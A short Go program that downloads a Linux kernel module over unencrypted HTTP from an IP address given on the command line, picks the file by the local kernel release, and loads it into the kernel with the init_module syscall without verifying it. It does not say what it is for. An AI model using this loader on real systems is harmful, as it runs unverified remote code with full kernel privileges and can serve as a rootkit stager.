package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "usage: %s ip\n", os.Args[0])
		os.Exit(1)
	}

	url := createUrl(os.Args[1])

	module := getModule(url)

	loadModule(module)
}

func loadModule(module []byte) {
	var param string = ""

	bufp := *(*uintptr)(unsafe.Pointer(&module))
	length := uintptr(len(module))
	paramp := uintptr(unsafe.Pointer(&param))

	_, _, errno := syscall.Syscall(syscall.SYS_INIT_MODULE, bufp, length, paramp)
	if int(errno) != 0 {
		panic(errno)
	}
}

func getModule(url string) []byte {
	resp, err := http.Get(url)
	check(err)

	if resp.StatusCode != 200 {
		fmt.Fprintf(os.Stderr, "Http request failed with %d\n", resp.StatusCode)
		os.Exit(1)
	}

	data, err := io.ReadAll(resp.Body)
	check(err)

	return data
}

func createUrl(host string) string {
	rel := getKernelRelease()
	url := fmt.Sprintf("http://%s/%s", os.Args[1], rel)

	return url
}

func getKernelRelease() string {
	var utsname syscall.Utsname
	err := syscall.Uname(&utsname)
	check(err)

	var rel string
	for _, c := range utsname.Release {
		if c == 0 {
			break
		}

		rel += string(rune(c))
	}

	// The format from uname -r is X.Y.Z-AB-arch
	// Cut off the `-arch` part
	idx := strings.LastIndex(rel, "-")
	rel = rel[0:idx]

	return rel
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}
